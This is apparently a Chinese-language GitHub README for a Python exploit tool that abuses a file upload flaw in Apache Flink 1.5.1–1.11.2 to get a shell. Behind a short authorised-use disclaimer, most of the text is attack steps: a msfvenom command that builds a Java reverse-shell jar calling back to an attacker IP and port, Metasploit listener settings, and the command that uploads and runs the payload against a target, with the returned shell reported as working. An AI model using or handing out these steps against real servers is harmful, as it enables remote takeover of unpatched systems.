# Apache-flink-fileupload-getshell
Apache-Flink


# 免责声明
使用本程序请自觉遵守当地法律法规，出现一切后果均与作者无关。

本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!

严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!

由于用户滥用造成的一切后果与作者无关。

切勿用于非法用途，非法使用造成的一切后果由自己承担，与作者无关。

### 背景介绍
```
Apache Flink是一个面向数据流处理和批量数据处理的可分布式的开源计算框架。它可以用来做批处理，即处理静态的数据集、历史的数据集；也可以用来做流处理，即实时地处理一些实时数据流，实时地产生数据的结果；也可以用来做一些基于事件的应用；该漏洞允许攻击者利用REST API，并通过精心构造的HTTP Header，实现远程文件写入。

影响版本：Apache Flink: 1.5.1 —— 1.11.2
```


### 食用方法

首先需要使用msf生成一个jar包的攻击载荷
```
msfvenom -p java/shell_reverse_tcp lhost=192.168.99.5 lport=4444 -f jar > exp.jar
```

![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/24e8e86b-571b-4670-bae1-83eb89b204e5)


将攻击载荷`exp.jar`放入到python脚本的同级目录下

注：在脚本中攻击载荷的名字写死了为`exp.jar`，使用者可以随意更换

攻击载荷生成完成后，在msf上建立监听接受反弹的shell

```
use exploit/multi/handler

set payload java/shell/reverse_tcp

set LHOST 0.0.0.0

set LPORT 4444

exploit
```
![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/63d6b1f9-45ba-4a3b-91ee-d3319c0e361a)


随后执行python脚本
```
 python .\apache_flink文件上传getshell.py -u http://192.168.99.7:8081
```
![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/a1d2474c-78e7-4554-ab65-f9b9f1fa7b6e)


脚本会返回apache-flink的版本信息，若存在漏洞则会上传`exp.jar`包，成功上传后会返回jar包落地的文件名，并且会执行该jar包
执行完攻击载荷就可以在msf上看是否反弹了shell回来

![image](https://github.com/FeiNiao/Apache-flink-fileupload-getshell/assets/66779835/8c367411-c3ce-4043-be51-fcf55629b5f8)

成功反弹shell，并且可以成功执行命令
